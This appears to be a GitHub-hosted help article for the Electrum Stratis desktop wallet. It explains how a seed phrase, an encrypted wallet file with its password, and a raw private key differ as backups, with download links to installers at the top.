![Electrum-Stratis](assets/banner-article.png)

# Three backup models: seed, wallet file and password

<p align="center">Three backup objects and what each one survives</p>

<p align="center"><a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe"><img alt="Download for Windows" src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-089ae8?style=for-the-badge&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg"><img alt="Download for macOS" src="https://img.shields.io/badge/DOWNLOAD-MACOS-089ae8?style=for-the-badge&labelColor=071727&logo=apple&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip"><img alt="Download for Linux" src="https://img.shields.io/badge/DOWNLOAD-LINUX-089ae8?style=for-the-badge&labelColor=071727&logo=linux&logoColor=ffffff"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img alt="Windows" height="24" src="https://img.shields.io/badge/os-windows-089ae8?style=flat-square&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"> | Windows 10 (1909) or later, 64-bit | [`electrum-stratis-v2.7.19.exe`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe) |
| <img alt="macOS" height="24" src="https://img.shields.io/badge/os-macos-089ae8?style=flat-square&labelColor=071727&logo=apple&logoColor=ffffff"> | macOS 12 or later | [`electrum-stratis-v2.7.19.dmg`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg) |
| <img alt="Linux" height="24" src="https://img.shields.io/badge/os-linux-089ae8?style=flat-square&labelColor=071727&logo=linux&logoColor=ffffff"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-stratis-v2.7.19.zip`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip) |

</div>

All versions, installers and checksums are on the [Electrum-Stratis v2.7.19 release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19).

> Only download from this GitHub release page.

A Stratis wallet can be backed up in three ways, and they are not equivalent. A seed rebuilds the wallet from nothing; a wallet file plus its password opens the wallet you already have; a raw private key rescues one address. Only the seed survives losing the machine, which is why it is the backup that matters and the others are copies. Electrum Stratis is a self-custody desktop wallet for the legacy Stratis chain.

## You'll see this if

<div align="center">

| What you hold | What it can restore | What it cannot do |
|---|---|---|
| A written seed | The whole wallet, on any machine | Recover coins from a different seed |
| A `.dat` file and its password | The wallet that file belongs to | Survive a forgotten password |
| A raw private key | One address and its coins | Rebuild the rest of the wallet |
| A screenshot or a note with an address | Nothing | Anything at all |

</div>

The most common mistake is treating the file as the backup and the seed as a detail. The file is a copy of the wallet; the seed is the wallet's origin, and it is the only object that can produce a wallet again from an empty machine.

## Why it happens

These three objects exist because the wallet solves three different problems. The seed is a compact derivation: one phrase generates every address the wallet will use, so restoring it reproduces the entire history without any file. The wallet file is ciphertext plus a verifier - convenient, fast, and useless without the password that decrypts it. A raw key is the lowest-level object: it controls exactly one address and nothing above it.

That hierarchy explains the failure modes. Lose the file but keep the seed and you have lost nothing. Keep the file but lose the password and you have a locked box you can only test guesses against. Keep only a key and you can rescue that address, but any other addresses the wallet held stay behind.

The wizard that walks through this hierarchy ships in the maintained build, whose current release is on the [release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19): it shows the seed once, then requires you to re-enter it in a shuffled order, because a seed you have not proved you wrote down is a seed you may not have.

## Fix

1. **Write the seed down the moment it is shown.** Paper, pen, two physical locations. The backup wizard forces the re-entry check for exactly this reason; do not skip past it.
2. **Keep a wallet file as a working copy, not as the backup.** Copy the `.dat` off the machine, record which password belongs to which file, and store the two separately. A file and its password in the same folder is one object, not two.
3. **Test the restore before the wallet matters.** Create a second wallet from the seed on another machine, confirm the addresses match, then delete the test. A backup you have never restored is an assumption.
4. **Record what the seed is for.** One line: which chain, which wallet, which date. Years later, the phrase alone does not tell you what it opens.
5. **Never store the seed digitally.** No photo, no note app, no cloud document, no password manager entry that syncs. A seed in a synced vault is a seed on someone else's disk.

If you hold only a `.dat` and have forgotten the password, the file can still test guesses, and the wallet's offline search can try candidates. What it cannot do is reveal the password. If you hold only a seed, you already have everything.

## If that did not work

If the seed restores a wallet with different addresses than you expect, the phrase is probably from a different wallet or a different derivation. Check the address preview before concluding anything, and compare against an address you know received funds.

If the file will not open and the search cannot succeed, the honest position is that the password is gone and the file stays closed. Keep it anyway; a file that cannot open today is the only object that could open if a password surfaces later.

If the seed is lost and the file is damaged, nothing recovers the wallet. No service, tool or person can reconstruct a seed that was never recorded.

## Prevention

- Write the seed on paper at creation; verify it by restoring once.
- Keep two copies in two places, and check them yearly.
- Store the file copy separately from its password.
- Label every backup with the wallet and date it belongs to.
- Never type the seed into anything except the wallet's own restore window - [Electrum Stratis security and keys](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/how-safe-is-the-desktop-wallet.md).

## FAQ

### All you need is the .dat file and your password. Is that true?

For opening that same wallet, yes - but it is not a backup strategy. A file you cannot decrypt after forgetting the password is a locked box, while the seed restores the wallet without the password at all. Keep the file for convenience and the seed for survival.

### How should I store Stratis securely?

Seed on paper in two locations, wallet file copied separately with its password recorded elsewhere, and a tested restore before the balance grows. For amounts that justify it, a hardware wallet keeps the keys off the machine entirely, and cold staking keeps them offline while still staking.

### If I have both the seed and the file, which do I use to restore?

The seed. It rebuilds the wallet from scratch and does not depend on a password you may have forgotten or a file that may be corrupt. Use the file when you want the exact same wallet back quickly and you still know its password.

### Can I keep the seed in a password manager?

A password manager that stores the phrase as text puts the wallet's entire security behind one master password and one synced device. Paper in two locations has fewer failure modes. If you must go digital, treat the phrase as the most valuable secret you own, and never let it sync to a consumer cloud account.

<!-- DOWNLOAD-BLOCK -->

## Related articles

- [Electrum Stratis password recovery: what is possible](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/password-cannot-be-recovered.md)
- [Is the seed enough to restore the wallet?](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/is-the-seed-enough-to-restore.md)
- [The Qt wallet does not work with a seed](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/qt-wallet-has-no-seed.md)
- [Why is my balance missing? Three causes](https://github.com/electrum-stratis-project/electrum-stratis-fixes/blob/main/balance-is-missing.md)
